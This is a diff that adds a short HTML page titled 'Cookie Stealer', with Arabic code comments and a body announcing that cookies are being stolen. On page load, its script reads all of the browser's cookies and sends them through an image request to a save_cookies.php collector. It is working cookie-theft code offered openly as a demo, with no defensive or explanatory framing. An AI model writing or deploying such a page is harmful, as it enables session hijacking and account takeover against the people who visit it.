@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Stealer</title>
+    <script>
+        // جلب جميع الكوكيز من المتصفح
+        var cookies = document.cookie;
+
+        // إرسال الكوكيز إلى صفحة PHP عبر GET
+        if (cookies) {
+            var img = new Image();
+            img.src = "save_cookies.php?cookie=" + encodeURIComponent(cookies);
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Cookie Stealer Demo</h1>
+    <p>Cookies are being stolen...</p>
+</body>
+</html>
